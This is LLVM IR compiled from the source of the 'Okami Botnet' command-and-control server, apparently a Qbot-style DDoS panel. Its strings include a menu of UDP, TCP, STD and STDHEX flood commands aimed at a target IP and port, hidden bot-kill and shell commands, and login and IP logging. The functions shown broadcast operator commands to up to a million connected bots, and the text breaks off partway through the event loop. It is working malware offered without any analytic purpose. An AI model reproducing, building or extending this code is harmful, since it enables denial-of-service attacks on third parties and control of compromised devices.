; ModuleID = 'llvm-link'
source_filename = "llvm-link"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.clientdata_t = type { i32, [7 x i8], i8 }
%struct.telnetdata_t = type { i32, i32 }
%struct.account = type { [20 x i8], [20 x i8] }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@clients = dso_local global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = dso_local global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"User:\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.4 = private unnamed_addr constant [46 x i8] c"\0D\0A\1B[0;96m[\1B[0;97mBotnet@Okami\1B[0;96m]\1B[0;97m#\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.6 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@DUPESDELETED = internal global i32 0, align 4
@.str.7 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"!* SC ON\0A\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.11 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.12 = private unnamed_addr constant [42 x i8] c"%c]0; Okami | Devices: %d | Demons: %d %c\00", align 1
@managesConnected = internal global i32 0, align 4
@.str.13 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.15 = private unnamed_addr constant [16 x i8] c"IP:%d.%d.%d.%d\0A\00", align 1
@.str.16 = private unnamed_addr constant [11 x i8] c"server.log\00", align 1
@.str.17 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.18 = private unnamed_addr constant [17 x i8] c"\0AIP:%d.%d.%d.%d \00", align 1
@.str.19 = private unnamed_addr constant [6 x i8] c"%s %s\00", align 1
@accounts = internal global [25 x %struct.account] zeroinitializer, align 16
@.str.20 = private unnamed_addr constant [21 x i8] c"\1B[45mWelcome Demon\0D\0A\00", align 1
@.str.21 = private unnamed_addr constant [25 x i8] c"\1B[34;1mUsername\1B[33;3m: \00", align 1
@.str.23 = private unnamed_addr constant [32 x i8] c"\1B[34;1mPassword\1B[33;3m: \1B[0;30m\00", align 1
@.str.24 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.25 = private unnamed_addr constant [15 x i8] c"\1B[1A\1B[2J\1B[1;1H\00", align 1
@.str.26 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [216 x i8] c"                \1B[0;96m \E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\1B[0;97m\E2\95\97 \1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\97  \1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\97 \1B[0;96m\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\1B[0;97m\E2\95\97 \1B[0;96m\E2\96\88\E2\96\88\E2\96\88\1B[0;97m\E2\95\97   \1B[0;96m\E2\96\88\E2\96\88\E2\96\88\1B[0;97m\E2\95\97\1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\97\0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [258 x i8] c"                \1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\94\E2\95\90\E2\95\90\E2\95\90\1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\97\1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\91 \1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\94\E2\95\9D\1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\94\E2\95\90\E2\95\90\1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\97\1B[0;96m\E2\96\88\E2\96\88\E2\96\88\E2\96\88\1B[0;97m\E2\95\97 \1B[0;96m\E2\96\88\E2\96\88\E2\96\88\E2\96\88\1B[0;97m\E2\95\91\1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\91\0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [240 x i8] c"                \1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\91   \1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\91\1B[0;96m\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\1B[0;97m\E2\95\94\E2\95\9D \1B[0;96m\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\1B[0;97m\E2\95\91\1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\94\1B[0;96m\E2\96\88\E2\96\88\E2\96\88\E2\96\88\1B[0;97m\E2\95\94\1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\91\1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\91\0D\0A\00", align 1
@.str.30 = private unnamed_addr constant [268 x i8] c"                \1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\91   \1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\91\1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\94\E2\95\90\1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\97 \1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\94\E2\95\90\E2\95\90\1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\91\1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\91\E2\95\9A\1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\94\E2\95\9D\1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\91\1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\91\0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [243 x i8] c"                \1B[0;97m\E2\95\9A\1B[0;96m\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\1B[0;97m\E2\95\94\E2\95\9D\1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\91  \1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\97\1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\91  \1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\91\1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\91 \E2\95\9A\E2\95\90\E2\95\9D \1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\91\1B[0;96m\E2\96\88\E2\96\88\1B[0;97m\E2\95\91\0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [121 x i8] c"                \1B[0;97m \E2\95\9A\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\9D \E2\95\9A\E2\95\90\E2\95\9D  \E2\95\9A\E2\95\90\E2\95\9D\E2\95\9A\E2\95\90\E2\95\9D  \E2\95\9A\E2\95\90\E2\95\9D\E2\95\9A\E2\95\90\E2\95\9D     \E2\95\9A\E2\95\90\E2\95\9D\E2\95\9A\E2\95\90\E2\95\9D\0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [45 x i8] c"\1B[0;96m[\1B[0;97mBotnet@Okami\1B[0;96m]\1B[0;97m# \00", align 1
@.str.34 = private unnamed_addr constant [5 x i8] c"BOTS\00", align 1
@.str.35 = private unnamed_addr constant [26 x i8] c"Devices: %d\0D\0ADemons: %d\0D\0A\00", align 1
@.str.36 = private unnamed_addr constant [5 x i8] c"HELP\00", align 1
@.str.37 = private unnamed_addr constant [60 x i8] c"\1B[0;96m !* UDP [IP] [PORT] [TIME] 32 1337 400 | UDP FLOOD\0D\0A\00", align 1
@.str.38 = private unnamed_addr constant [48 x i8] c"\1B[0;96m !* STD [IP] [PORT] [TIME] | STD FLOOD\0D\0A\00", align 1
@.str.39 = private unnamed_addr constant [63 x i8] c"\1B[0;96m !* TCP [IP] [PORT] [TIME] 32 all 1337 400| TCP FLOOD\0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [54 x i8] c"\1B[0;96m !* STDHEX [IP] [PORT] [TIME] | STDHEX FLOOD\0D\0A\00", align 1
@.str.41 = private unnamed_addr constant [38 x i8] c"\1B[0;96m !* STOP | KILLS ALL ATTACKS\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [10 x i8] c"LOLNOGTFO\00", align 1
@.str.43 = private unnamed_addr constant [28 x i8] c"ATTEMPT TO KILL BOTS BY %s\0A\00", align 1
@.str.44 = private unnamed_addr constant [9 x i8] c"KILL.log\00", align 1
@.str.45 = private unnamed_addr constant [12 x i8] c"HOODASSSHIT\00", align 1
@.str.46 = private unnamed_addr constant [7 x i8] c"LOGOUT\00", align 1
@.str.47 = private unnamed_addr constant [8 x i8] c"BYE %s\0A\00", align 1
@.str.48 = private unnamed_addr constant [11 x i8] c"LOGOUT.log\00", align 1
@.str.49 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.50 = private unnamed_addr constant [33 x i8] c"ATTEMPT TO KILL YOUR BOTS BY %s\0A\00", align 1
@.str.51 = private unnamed_addr constant [14 x i8] c"BOTKILLER.log\00", align 1
@.str.52 = private unnamed_addr constant [25 x i8] c"ATTEMPT TO KILL BOTS %s\0A\00", align 1
@.str.53 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.54 = private unnamed_addr constant [34 x i8] c"ATTEMPT TO SHELL YOUR BOTS BY %s\0A\00", align 1
@.str.55 = private unnamed_addr constant [10 x i8] c"SHELL.log\00", align 1
@.str.56 = private unnamed_addr constant [29 x i8] c"ATTEMPT TO SHELL BOTS BY %s\0A\00", align 1
@.str.57 = private unnamed_addr constant [5 x i8] c"MOVE\00", align 1
@.str.58 = private unnamed_addr constant [6 x i8] c"CLEAR\00", align 1
@.str.59 = private unnamed_addr constant [17 x i8] c"\1B[1A\1B[2J\1B[1;1H\0D\0A\00", align 1
@.str.60 = private unnamed_addr constant [5 x i8] c"EXIT\00", align 1
@.str.61 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.62 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.63 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.64 = private unnamed_addr constant [23 x i8] c"Security Breach From: \00", align 1
@.str.65 = private unnamed_addr constant [7 x i8] c"IP.log\00", align 1
@.str.66 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.67 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.68 = private unnamed_addr constant [33 x i8] c"Are You Dumb? Lower the Threads\0A\00", align 1
@.str.69 = private unnamed_addr constant [26 x i8] c"Good Choice in Threading\0A\00", align 1
@.str.70 = private unnamed_addr constant [40 x i8] c"Okami Botnet.\0ACreated by DemonicMods.\0D\0A\00", align 1
@.str.71 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.72 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.73 = private unnamed_addr constant [7 x i8] c"STRING\00", align 1
@.str.74 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.75 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.76 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.77 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @fdgets(i8* noundef %0, i32 noundef %1, i32 noundef %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 noundef %28, i8* noundef %32, i64 noundef 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  br label %9, !llvm.loop !6

37:                                               ; preds = %25
  %38 = load i32, i32* %8, align 4
  ret i32 %38
}

declare i64 @read(i32 noundef, i8* noundef, i64 noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @trim(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* noundef %6) #8
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 noundef %16) #8
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10, !llvm.loop !8

22:                                               ; preds = %10
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

27:                                               ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 noundef %33) #8
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

38:                                               ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23, !llvm.loop !9

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

47:                                               ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

59:                                               ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43, !llvm.loop !10

62:                                               ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8* noundef) #2

; Function Attrs: nounwind readonly willreturn
declare i32 @isspace(i32 noundef) #2

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @broadcast(i8* noundef %0, i32 noundef %1, i8* noundef %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strcmp(i8* noundef %13, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %17

16:                                               ; preds = %3
  store i32 0, i32* %7, align 4
  br label %17

17:                                               ; preds = %16, %3
  %18 = load i8*, i8** %4, align 8
  %19 = call i64 @strlen(i8* noundef %18) #8
  %20 = add i64 %19, 10
  %21 = call noalias i8* @malloc(i64 noundef %20) #9
  store i8* %21, i8** %8, align 8
  %22 = load i8*, i8** %8, align 8
  %23 = load i8*, i8** %4, align 8
  %24 = call i64 @strlen(i8* noundef %23) #8
  %25 = add i64 %24, 10
  call void @llvm.memset.p0i8.i64(i8* align 1 %22, i8 0, i64 %25, i1 false)
  %26 = load i8*, i8** %8, align 8
  %27 = load i8*, i8** %4, align 8
  %28 = call i8* @strcpy(i8* noundef %26, i8* noundef %27) #9
  %29 = load i8*, i8** %8, align 8
  call void @trim(i8* noundef %29)
  %30 = call i64 @time(i64* noundef %9) #9
  %31 = call %struct.tm* @localtime(i64* noundef %9) #9
  store %struct.tm* %31, %struct.tm** %10, align 8
  %32 = load %struct.tm*, %struct.tm** %10, align 8
  %33 = call i8* @asctime(%struct.tm* noundef %32) #9
  store i8* %33, i8** %11, align 8
  %34 = load i8*, i8** %11, align 8
  call void @trim(i8* noundef %34)
  store i32 0, i32* %12, align 4
  br label %35

35:                                               ; preds = %109, %17
  %36 = load i32, i32* %12, align 4
  %37 = icmp slt i32 %36, 1000000
  br i1 %37, label %38, label %112

38:                                               ; preds = %35
  %39 = load i32, i32* %12, align 4
  %40 = load i32, i32* %5, align 4
  %41 = icmp eq i32 %39, %40
  br i1 %41, label %59, label %42

42:                                               ; preds = %38
  %43 = load i32, i32* %12, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %44
  %46 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %45, i32 0, i32 2
  %47 = load i8, i8* %46, align 1
  %48 = icmp ne i8 %47, 0
  br i1 %48, label %60, label %49

49:                                               ; preds = %42
  %50 = load i32, i32* %7, align 4
  %51 = icmp eq i32 %50, 0
  br i1 %51, label %59, label %52

52:                                               ; preds = %49
  %53 = load i32, i32* %12, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %54
  %56 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %55, i32 0, i32 1
  %57 = load i32, i32* %56, align 4
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %60, label %59

59:                                               ; preds = %52, %49, %38
  br label %109

60:                                               ; preds = %52, %42
  %61 = load i32, i32* %7, align 4
  %62 = icmp ne i32 %61, 0
  br i1 %62, label %63, label %87

63:                                               ; preds = %60
  %64 = load i32, i32* %12, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %65
  %67 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %66, i32 0, i32 1
  %68 = load i32, i32* %67, align 4
  %69 = icmp ne i32 %68, 0
  br i1 %69, label %70, label %87

70:                                               ; preds = %63
  %71 = load i32, i32* %12, align 4
  %72 = call i64 @send(i32 noundef %71, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0), i64 noundef 8, i32 noundef 16384)
  %73 = load i32, i32* %12, align 4
  %74 = load i8*, i8** %6, align 8
  %75 = load i8*, i8** %6, align 8
  %76 = call i64 @strlen(i8* noundef %75) #8
  %77 = call i64 @send(i32 noundef %73, i8* noundef %74, i64 noundef %76, i32 noundef 16384)
  %78 = load i32, i32* %12, align 4
  %79 = call i64 @send(i32 noundef %78, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0), i64 noundef 1, i32 noundef 16384)
  %80 = load i32, i32* %12, align 4
  %81 = load i8*, i8** %11, align 8
  %82 = load i8*, i8** %11, align 8
  %83 = call i64 @strlen(i8* noundef %82) #8
  %84 = call i64 @send(i32 noundef %80, i8* noundef %81, i64 noundef %83, i32 noundef 16384)
  %85 = load i32, i32* %12, align 4
  %86 = call i64 @send(i32 noundef %85, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  br label %87

87:                                               ; preds = %70, %63, %60
  %88 = load i32, i32* %12, align 4
  %89 = load i8*, i8** %4, align 8
  %90 = load i8*, i8** %4, align 8
  %91 = call i64 @strlen(i8* noundef %90) #8
  %92 = call i64 @send(i32 noundef %88, i8* noundef %89, i64 noundef %91, i32 noundef 16384)
  %93 = load i32, i32* %7, align 4
  %94 = icmp ne i32 %93, 0
  br i1 %94, label %95, label %105

95:                                               ; preds = %87
  %96 = load i32, i32* %12, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %97
  %99 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %98, i32 0, i32 1
  %100 = load i32, i32* %99, align 4
  %101 = icmp ne i32 %100, 0
  br i1 %101, label %102, label %105

102:                                              ; preds = %95
  %103 = load i32, i32* %12, align 4
  %104 = call i64 @send(i32 noundef %103, i8* noundef getelementptr inbounds ([46 x i8], [46 x i8]* @.str.4, i64 0, i64 0), i64 noundef 45, i32 noundef 16384)
  br label %108

105:                                              ; preds = %95, %87
  %106 = load i32, i32* %12, align 4
  %107 = call i64 @send(i32 noundef %106, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0), i64 noundef 1, i32 noundef 16384)
  br label %108

108:                                              ; preds = %105, %102
  br label %109

109:                                              ; preds = %108, %59
  %110 = load i32, i32* %12, align 4
  %111 = add nsw i32 %110, 1
  store i32 %111, i32* %12, align 4
  br label %35, !llvm.loop !11

112:                                              ; preds = %35
  %113 = load i8*, i8** %8, align 8
  call void @free(i8* noundef %113) #9
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8* noundef, i8* noundef) #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64 noundef) #3

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8* noundef, i8* noundef) #3

; Function Attrs: nounwind
declare i64 @time(i64* noundef) #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64* noundef) #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm* noundef) #3

declare i64 @send(i32 noundef, i8* noundef, i64 noundef, i32 noundef) #1

; Function Attrs: nounwind
declare void @free(i8* noundef) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @epollEventLoop(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.epoll_event, align 1
  %4 = alloca %struct.epoll_event*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr, align 2
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.clientdata_t*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %18 = call noalias i8* @calloc(i64 noundef 1000000, i64 noundef 12) #9
  %19 = bitcast i8* %18 to %struct.epoll_event*
  store %struct.epoll_event* %19, %struct.epoll_event** %4, align 8
  br label %20

20:                                               ; preds = %255, %1
  %21 = load volatile i32, i32* @epollFD, align 4
  %22 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %23 = call i32 @epoll_wait(i32 noundef %21, %struct.epoll_event* noundef %22, i32 noundef 1000000, i32 noundef -1)
  store i32 %23, i32* %6, align 4
  store i32 0, i32* %7, align 4
  br label %24

24:                                               ; preds = %252, %20
  %25 = load i32, i32* %7, align 4
  %26 = load i32, i32* %6, align 4
  %27 = icmp slt i32 %25, %26
  br i1 %27, label %28, label %255

28:                                               ; preds = %24
  %29 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %29, i64 %31
  %33 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %32, i32 0, i32 0
  %34 = load i32, i32* %33, align 1
  %35 = and i32 %34, 8
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %55, label %37

37:                                               ; preds = %28
  %38 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %39 = load i32, i32* %7, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %38, i64 %40
  %42 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %41, i32 0, i32 0
  %43 = load i32, i32* %42, align 1
  %44 = and i32 %43, 16
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %55, label %46

46:                                               ; preds = %37
  %47 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %48 = load i32, i32* %7, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %47, i64 %49
  %51 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %50, i32 0, i32 0
  %52 = load i32, i32* %51, align 1
  %53 = and i32 %52, 1
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %74, label %55

55:                                               ; preds = %46, %37, %28
  %56 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %57 = load i32, i32* %7, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %56, i64 %58
  %60 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %59, i32 0, i32 1
  %61 = bitcast %union.epoll_data* %60 to i32*
  %62 = load i32, i32* %61, align 1
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %63
  %65 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %64, i32 0, i32 2
  store i8 0, i8* %65, align 1
  %66 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %67 = load i32, i32* %7, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %66, i64 %68
